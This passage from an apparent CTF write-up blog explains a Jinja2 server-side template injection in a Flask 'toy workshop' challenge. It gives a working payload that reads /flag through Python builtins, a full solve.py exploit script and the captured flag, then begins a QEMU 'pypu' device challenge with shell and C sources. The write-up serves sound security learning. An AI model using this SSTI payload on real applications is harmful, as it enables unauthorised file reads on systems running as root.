</pre><td class="rouge-code"><pre><span class="cm">/* Wooden Train */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">stop</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">tickets</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"choo choo!"</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"cargo: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"line: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"next station:"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">stop</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">stop</span><span class="p">),</span> <span class="n">stdin</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">stop</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'a'</span> <span class="o">||</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'e'</span> <span class="o">||</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'i'</span> <span class="o">||</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'o'</span> <span class="o">||</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'u'</span><span class="p">)</span> <span class="n">tickets</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"next stop: %s"</span><span class="p">,</span> <span class="n">stop</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"tickets punched: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tickets</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details><p>This challenge exposes a small Flask-based <code class="language-plaintext highlighter-rouge">toy workshop</code> where users can:</p><ul><li><code class="language-plaintext highlighter-rouge">/create</code> ‚Äì choose a C template and copy it under a hashed filename<li><code class="language-plaintext highlighter-rouge">/tinker/&lt;toy_id&gt;</code> ‚Äì modify or <code class="language-plaintext highlighter-rouge">render</code> the source<li><code class="language-plaintext highlighter-rouge">/assemble</code> ‚Äì compile the toy with <code class="language-plaintext highlighter-rouge">gcc</code><li><code class="language-plaintext highlighter-rouge">/play/&lt;toy_id&gt;</code> ‚Äì run the the compiled binary</ul><p><code class="language-plaintext highlighter-rouge">/run/workshop/tinkering</code> ‚Äì where source files live</p><p><code class="language-plaintext highlighter-rouge">/run/workshop/assembled</code> ‚Äì where binaries are placed</p><p>It is noticable that in <code class="language-plaintext highlighter-rouge">/tinker</code>, we have fully control over template content:</p><ul><li><code class="language-plaintext highlighter-rouge">replace</code> allows us to modify arbitrary slices of the source file.<li><code class="language-plaintext highlighter-rouge">render</code> reads the current text from the file, run <code class="language-plaintext highlighter-rouge">render_template_string(text, **ctx)</code> and write the rendered result back to the file.</ul><p>Here, <code class="language-plaintext highlighter-rouge">render_template_string</code> is called inside the Flask app before dropping privileges. The Flask app runs as <code class="language-plaintext highlighter-rouge">root</code> and the template content comes from the file we control. As a result, this is a Jinja2 SSTI (Server-Side Template Injection) vulnerability.</p><p>In <code class="language-plaintext highlighter-rouge">/assemble</code>, at <code class="language-plaintext highlighter-rouge">preexec_fn=drop_privs</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">drop_privs</span><span class="p">():</span>
    <span class="n">pw</span> <span class="o">=</span> <span class="n">pwd</span><span class="p">.</span><span class="nf">getpwnam</span><span class="p">(</span><span class="sh">"</span><span class="s">nobody</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setgroups</span><span class="p">([])</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setgid</span><span class="p">(</span><span class="n">pw</span><span class="p">.</span><span class="n">pw_gid</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="n">pw</span><span class="p">.</span><span class="n">pw_uid</span><span class="p">)</span>
</pre></table></code></div></div><p>This means <code class="language-plaintext highlighter-rouge">gcc</code> runs as user <code class="language-plaintext highlighter-rouge">nobody</code>, not <code class="language-plaintext highlighter-rouge">root</code> =&gt; we cannot open <code class="language-plaintext highlighter-rouge">/flag</code> with C. The <code class="language-plaintext highlighter-rouge">flag</code> file must be open before privileges are dropped.</p><hr /><h3 id="exploitation-7"><span class="me-2">Exploitation</span><a href="#exploitation-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>My plan is:</p><ul><li><code class="language-plaintext highlighter-rouge">Create</code> a toy to get a valid <code class="language-plaintext highlighter-rouge">toy_id</code><li><code class="language-plaintext highlighter-rouge">Replace</code> its source with a malicious Jinja-powered C template:<ul><li>Use Jinja to read <code class="language-plaintext highlighter-rouge">/flag</code> as root.<li>Embed the result into a C string literal.</ul><li><code class="language-plaintext highlighter-rouge">Render</code> the template via <code class="language-plaintext highlighter-rouge">op="render"</code> to trigger Jinja.<li><code class="language-plaintext highlighter-rouge">Assemble</code> the C file with <code class="language-plaintext highlighter-rouge">gcc</code>.<li><code class="language-plaintext highlighter-rouge">Play</code> the binary and read the flag from its stdout.</ul><p>After searching from internet, I finnaly craft a payload:</p><div class="language-jinja highlighter-rouge"><div class="code-header"> <span data-label-text="Jinja"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">{%</span> <span class="k">set</span> <span class="nv">flag</span> <span class="o">=</span> <span class="nv">config.__class__.__init__.__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'open'</span><span class="p">](</span><span class="s1">'/flag'</span><span class="p">)</span><span class="err">.</span><span class="nv">read</span><span class="p">()</span> <span class="cp">%}</span>
#include <span class="nt">&lt;stdio.h&gt;</span>

int main(void) {
    puts(<span class="cp">{{</span> <span class="nv">flag</span><span class="o">|</span><span class="nf">tojson</span> <span class="cp">}}</span>);
    return 0;
}
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">{% ... %}</code> line is a Jinja statement that opens and reads /flag into the flag variable. The <code class="language-plaintext highlighter-rouge">{{ flag|tojson }}</code> expression inserts that value into the output C code. The <code class="language-plaintext highlighter-rouge">tojson</code> filter ensures that if the flag contains special characters (quotes, newlines, backslashes, etc.), they are properly escaped so that the generated C string literal is valid.</p><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">requests</span>

<span class="n">BASE_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://localhost</span><span class="sh">"</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="c1"># 1) create toy
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/create</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">template</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">robot.c.j2</span><span class="sh">"</span><span class="p">})</span>
<span class="n">r</span><span class="p">.</span><span class="nf">raise_for_status</span><span class="p">()</span>
<span class="n">toy_id</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">toy_id</span><span class="sh">"</span><span class="p">]</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] toy_id =</span><span class="sh">"</span><span class="p">,</span> <span class="n">toy_id</span><span class="p">)</span>

<span class="c1"># 2) replace
</span><span class="n">malicious_tpl</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">"""</span><span class="s">{% set flag = config.__class__.__init__.__globals__[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="s">][</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="s">](</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="s">).read() %}
#include &lt;stdio.h&gt;

int main(void) {
    puts({{ flag|tojson }});
    return 0;
}
</span><span class="sh">"""</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
    <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/tinker/</span><span class="si">{</span><span class="n">toy_id</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="sh">"</span><span class="s">op</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">length</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1000000</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="n">malicious_tpl</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] replace:</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># 3) render
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
    <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/tinker/</span><span class="si">{</span><span class="n">toy_id</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="sh">"</span><span class="s">op</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">render</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">context</span><span class="sh">"</span><span class="p">:</span> <span class="p">{},</span>
    <span class="p">},</span>
<span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] render:</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># 4) assemble
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/assemble/</span><span class="si">{</span><span class="n">toy_id</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{})</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] assemble:</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
    <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="sh">"</span><span class="s">assemble failed</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># 5) run
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/play/</span><span class="si">{</span><span class="n">toy_id</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">stdin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] play:</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] returncode:</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">returncode</span><span class="sh">"</span><span class="p">])</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] stderr:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">stderr</span><span class="sh">"</span><span class="p">])</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] stdout:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">stdout</span><span class="sh">"</span><span class="p">])</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{UWN1SyikjRpaDbMwpXdKmavc98e.0VN0EjMywiN1UDN0EzW}</code></p><hr /><h2 id="day09"><span class="me-2">Day09</span><a href="#day09" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-8"><span class="me-2">Description</span><a href="#description-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This year, Santa decided you‚Äôve been especially good and left you a shiny new <strong>Python Processing Unit (pypu)</strong> ‚Äî a mysterious PCIe accelerator built to finally quiet all the elves who won‚Äôt stop grumbling that <strong>‚ÄúPython is slow‚Äù</strong> üêçüí®. This festive silicon snack happily devours <code class="language-plaintext highlighter-rouge">.pyc</code> bytecode at hardware speed‚Ä¶ but Santa forgot to include any userspace tools, drivers, or documentation for how to actually use it. üéÅ All you‚Äôve got is a bare MMIO interface, a device that will execute whatever <code class="language-plaintext highlighter-rouge">.pyc</code> you can wrangle together, and the hope that you can coax this strange gift into revealing an <em>extra</em> gift. Time to poke, prod, reverse-engineer, and see what surprises your new holiday hardware is hiding under the tree. üéÑ‚ú®</p><hr /><h3 id="analysis-8"><span class="me-2">Analysis</span><a href="#analysis-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>run.sh</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/exec-suid -- /bin/bash -p</span>

<span class="nb">set</span> <span class="nt">-euo</span> pipefail

<span class="nv">PATH</span><span class="o">=</span><span class="s2">"/challenge/runtime/qemu/bin:</span><span class="nv">$PATH</span><span class="s2">"</span>

qemu-system-x86_64 <span class="se">\</span>
  <span class="nt">-machine</span> q35 <span class="se">\</span>
  <span class="nt">-cpu</span> qemu64 <span class="se">\</span>
  <span class="nt">-m</span> 512M <span class="se">\</span>
  <span class="nt">-nographic</span> <span class="se">\</span>
  <span class="nt">-no-reboot</span> <span class="se">\</span>
  <span class="nt">-kernel</span> /challenge/runtime/bzImage <span class="se">\</span>
  <span class="nt">-initrd</span> /challenge/runtime/rootfs.cpio.gz <span class="se">\</span>
  <span class="nt">-append</span> <span class="s2">"console=ttyS0 quiet panic=-1"</span> <span class="se">\</span>
  <span class="nt">-device</span> pypu-pci <span class="se">\</span>
  <span class="nt">-serial</span> stdio <span class="se">\</span>
  <span class="nt">-monitor</span> none
</pre></table></code></div></div></details> <details> <summary>Click to view <code>src/pypu-capture.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"qemu/osdep.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;Python.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"pypu-capture.h"</span><span class="cp">
</span>
<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">capture_write</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuCapture</span> <span class="o">*</span><span class="n">cf</span> <span class="o">=</span> <span class="p">(</span><span class="n">PypuCapture</span> <span class="o">*</span><span class="p">)</span><span class="n">self</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">Py_ssize_t</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyArg_ParseTuple</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">"s#"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">||</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Py_RETURN_NONE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">size_t</span> <span class="n">copy_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">len</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_len</span> <span class="o">&gt;</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">copy_len</span> <span class="o">=</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">copy_len</span><span class="p">);</span>
        <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">+=</span> <span class="n">copy_len</span><span class="p">;</span>
        <span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">PyLong_FromSsize_t</span><span class="p">((</span><span class="n">Py_ssize_t</span><span class="p">)</span><span class="n">copy_len</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">capture_flush</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">Py_UNUSED</span><span class="p">(</span><span class="n">ignored</span><span class="p">))</span>
<span class="p">{</span>
    <span class="n">Py_RETURN_NONE</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">capture_seek</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PypuCapture</span> <span class="o">*</span><span class="n">cf</span> <span class="o">=</span> <span class="p">(</span><span class="n">PypuCapture</span> <span class="o">*</span><span class="p">)</span><span class="n">self</span><span class="p">;</span>
    <span class="n">Py_ssize_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">whence</span> <span class="o">=</span> <span class="n">SEEK_SET</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyArg_ParseTuple</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">"n|i"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whence</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">Py_ssize_t</span> <span class="n">newpos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">whence</span> <span class="o">==</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">newpos</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">whence</span> <span class="o">==</span> <span class="n">SEEK_CUR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">newpos</span> <span class="o">=</span> <span class="p">(</span><span class="n">Py_ssize_t</span><span class="p">)</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">whence</span> <span class="o">==</span> <span class="n">SEEK_END</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Py_ssize_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">?</span> <span class="p">(</span><span class="n">Py_ssize_t</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">newpos</span> <span class="o">=</span> <span class="n">end</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">PyErr_SetString</span><span class="p">(</span><span class="n">PyExc_ValueError</span><span class="p">,</span> <span class="s">"invalid whence"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">Py_ssize_t</span> <span class="n">max_pos</span> <span class="o">=</span> <span class="p">(</span><span class="n">Py_ssize_t</span><span class="p">)((</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">newpos</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">newpos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">newpos</span> <span class="o">&gt;</span> <span class="n">max_pos</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">newpos</span> <span class="o">=</span> <span class="n">max_pos</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">newpos</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">PyLong_FromSize_t</span><span class="p">(</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">PyMethodDef</span> <span class="n">capture_methods</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">{</span><span class="s">"write"</span><span class="p">,</span> <span class="n">capture_write</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"Append to buffer"</span><span class="p">},</span>
    <span class="p">{</span><span class="s">"flush"</span><span class="p">,</span> <span class="n">capture_flush</span><span class="p">,</span> <span class="n">METH_NOARGS</span><span class="p">,</span> <span class="s">"No-op flush"</span><span class="p">},</span>
    <span class="p">{</span><span class="s">"seek"</span><span class="p">,</span> <span class="n">capture_seek</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"Adjust write position"</span><span class="p">},</span>
    <span class="p">{</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">},</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">PyTypeObject</span> <span class="n">CaptureType</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">.</span><span class="n">tp_name</span> <span class="o">=</span> <span class="s">"pypu.Capture"</span><span class="p">,</span>
    <span class="p">.</span><span class="n">tp_basicsize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PypuCapture</span><span class="p">),</span>
    <span class="p">.</span><span class="n">tp_flags</span> <span class="o">=</span> <span class="n">Py_TPFLAGS_DEFAULT</span><span class="p">,</span>
    <span class="p">.</span><span class="n">tp_methods</span> <span class="o">=</span> <span class="n">capture_methods</span><span class="p">,</span>
<span class="p">};</span>

